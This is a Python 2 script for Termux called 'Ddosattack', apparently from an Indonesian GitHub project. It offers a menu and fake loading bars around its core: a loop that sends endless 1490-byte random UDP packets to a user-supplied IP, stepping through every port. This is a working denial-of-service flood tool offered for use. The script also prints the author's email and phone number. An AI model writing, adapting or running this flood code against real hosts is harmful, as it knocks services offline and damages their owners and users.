#!/data/data/com.termux/files/usr/bin/python
# -*- coding: utf-8 -*-
# Ddosattack
# Coded by Nedi Senja
# Github: https://github.com/stepbystepexe/Ddosattack

from __opt__ import *
import os, sys, time, random, socket, string, marshal
from datetime import datetime

info = """
Nama        : Ddosattack
Versi       : 3.2 (Update: 21 Desember 2020, 7:00 PM)
Tanggal     : 10 Juni 2019
Author      : Nedi Senja
Tujuan      : Untuk membanjiri Webhosting
              hanya script sederhana
Terimakasih : Allah SWT.
              FR13NDS, & seluruh
              manusia seplanet bumi
NB          : Manusia gax ada yang sempurna
              sama kaya tool ini.
              Silahkan laporkan kritik atau saran
              Ke - Email: d_q16x@outlook.co.id
                 - WhatsApp: +62 8577-5433-901

[ \033[4mGunakan tool ini dengan bijak \033[0m]\n """

example = """\033[0;104;77;1m[      Denial of Service, My Github: @stepbystepexe      ]\033[0m"""

now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)

def restart():
    python = sys.executable
    os.execl(python, python, * sys.argv)
    curdir = os.getcwd()

def loads():
    x = [
     '.   ', '..  ', '... ']
    for o in x:
        print '\r\x1b[0m[\x1b[94;1m\xe2\x97\x8f\x1b[0m] \x1b[0mMemulai ' + o,
        sys.stdout.flush()
        time.sleep(1)

def write(o):
    for i in o + '\n':
        sys.stdout.write(i)
        sys.stdout.flush()
        time.sleep(0.03)

def config():
    ip = raw_input("\n\033[0m[\033[93;1m+\033[0m] \033[77;1mIP Target: \033[0m")
    port = input("\033[0m[\033[92;1m+\033[0m] \033[77;1mPort: \033[0m")
    print
    write("\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mMengecek ...")
    time.sleep(1)
    print
    print("[ IIIIIIIIIIII Loads       15%                          ]")
    time.sleep(5)
    print("[ IIIIIIIIIIIIIIIIII Loads       25%                    ]")
    time.sleep(5)
    print("[ IIIIIIIIIIIIIIIIIIIIIIII Loads       50%              ]")
    time.sleep(5)
    print("[ IIIIIIIIIIIIIIIIIIIIIIIIIIIIII Loads       75%        ]")
    time.sleep(5)
    print("[ IIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIII Loads       100% ]")
    print
    loads()
    print
    time.sleep(3)
    sent = 0
    while True:
         sock.sendto(bytes,(ip,port))
         sent = sent + 1
         port = port + 1
         print "\033[0mMengirim \033[1;2;96m%s \033[0mPaket ke %s Target \033[1;2;91m%s"%(sent, ip, port)
         if port == 65534:
           port = 1

os.system('clear')
os.system('reset')
time.sleep(1)
print
print(logo)
print(example)
print
print("\033[0m[\033[1;96mあ\033[0m] \033[1;77mMulai Menggunakan Ddosattack")
print
print("\033[0m[\033[93;1m&\033[0m] LISENSI")
print("\033[0m[\033[94;1m#\033[0m] Informasi")
print("\033[0m[\033[92;1m*\033[0m] Perbarui")
print("\033[0m[\033[91;1m-\033[0m] Keluar")
print
option = raw_input("\033[0m[\033[1;95m/\033[0m] \033[1;77mMasukan opsi: \033[0m")
if option.strip() in 'あ 1 mulai'.split():
    config()
elif option.strip() in '& 2 lisensi'.split():
    print
    os.system('nano LICENSE')
    print
    restart()
elif option.strip() in '# 3 info'.split():
    os.system('clear')
    print(example)
    os.system('toilet -f smslant Attacks')
    print(info)
    time.sleep(1)
    print
    raw_input('[ Tekan Enter ]')
    restart()
elif option.strip() in '* 4 perbarui'.split():
    print
    os.system('git pull origin master')
    print
    raw_input('\033[0m[ \033[92mTekan Enter \033[0m]')
    restart()
elif option.strip() in '- keluar 0'.split():
    print("\n\033[0m[\033[1;91m!\033[0m] \033[1;77mKeluar dari program!")
    print
    sys.exit(1)
else:
    print("\n\033[0m[=\033[1;41;77m Pilihan Salah \033[0m=]")
    print
    time.sleep(1)
    restart()
